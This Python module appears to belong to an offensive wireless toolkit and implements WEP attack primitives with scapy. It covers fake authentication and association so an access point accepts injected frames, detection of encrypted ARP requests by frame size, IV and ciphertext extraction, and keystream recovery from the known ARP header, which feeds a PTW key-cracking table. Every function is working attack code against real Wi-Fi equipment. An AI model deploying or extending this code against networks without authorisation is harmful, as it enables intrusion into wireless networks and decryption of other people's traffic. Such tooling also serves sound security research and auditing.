"""WEP attack primitives: fake authentication and frame parsing.

ARP-replay orchestration lives in `wep_replay.py`; full key-recovery
orchestration lives in `wep_crack.py`. This module keeps the shared
building blocks (fake-auth, ARP-candidate detection, IV/ciphertext
extraction, PTW table feeding) so both attack paths can reuse them
without importing each other's orchestration code.

Logic cherry-picked from documented fake-auth and ARP-replay attack
behavior (see research/wep_attacks_dim03.md) and reimplemented natively
here, matching this project's native-only mandate.

Frame parsing reads raw bytes from the Dot11WEP layer onward rather than
trusting scapy's `icv` IntField, matching this project's existing pattern
(frames.py's EAPOL parsing, wps/eap.py) of not trusting scapy's field
decoding for fields where raw-byte layout is what actually matters.
"""

from __future__ import annotations

from scapy.layers.dot11 import Dot11, Dot11WEP
from scapy.packet import Packet
from scapy.sendrecv import sendp

from ..frames import BROADCAST, craft_assoc_req, craft_auth
from ..radio import ensure_channel
from ..wep.crypto import recover_keystream
from ..wep.ptw import PTWVoteTable

# LLC/SNAP header + EtherType for ARP — the known-plaintext prefix every
# WEP ARP-based attack relies on (research/wep_attacks_dim02.md, dim06).
ARP_KNOWN_PREFIX = bytes.fromhex("aaaa030000000806")

# Known ARP-request size signature: 802.11 capture length (from
# the Dot11 header onward, i.e. excluding RadioTap) for a WEP-encrypted
# broadcast ARP request. 68 bytes from a wireless client, 86 from wired.
ARP_LEN_WIRELESS = 68
ARP_LEN_WIRED = 86


def fake_authenticate(iface: str, bssid: str, client: str, ssid: str, channel: int | None = None) -> None:
    """Open-system auth + association so the AP accepts later injected frames."""
    ensure_channel(iface, channel)
    sendp(craft_auth(bssid, client), iface=iface, verbose=False)
    sendp(craft_assoc_req(bssid, client, ssid=ssid), iface=iface, verbose=False)


def is_wep_arp_candidate(pkt: Packet) -> bool:
    """True if pkt looks like a WEP-encrypted broadcast ARP request by size."""
    if not pkt.haslayer(Dot11WEP):
        return False
    dot11 = pkt.getlayer(Dot11)
    if dot11 is None or not dot11.addr1 or dot11.addr1.lower() != BROADCAST:
        return False
    frame_len = len(bytes(dot11))
    return frame_len in (ARP_LEN_WIRELESS, ARP_LEN_WIRED)


def wep_iv_and_ciphertext(pkt: Packet) -> tuple[bytes, bytes] | None:
    """Extract (3-byte IV, ciphertext = encrypted plaintext||ICV) from a WEP frame."""
    wep_layer = pkt.getlayer(Dot11WEP)
    if wep_layer is None:
        return None
    raw = bytes(wep_layer)
    if len(raw) < 8:  # iv(3) + keyid(1) + at least 4 bytes of wepdata/icv
        return None
    iv, ciphertext = raw[:3], raw[4:]
    return iv, ciphertext


def add_captured_frame_to_table(table: PTWVoteTable, pkt: Packet) -> bool:
    """If pkt is a usable WEP ARP frame, recover its keystream and vote it.

    Returns True if the frame contributed a new session (new IV, enough
    keystream recovered for the table's configured key length).
    """
    if not is_wep_arp_candidate(pkt):
        return False
    extracted = wep_iv_and_ciphertext(pkt)
    if extracted is None:
        return False
    iv, ciphertext = extracted
    if len(ciphertext) < len(ARP_KNOWN_PREFIX):
        return False
    keystream = recover_keystream(ciphertext, ARP_KNOWN_PREFIX)
    return table.add_session(iv, keystream)
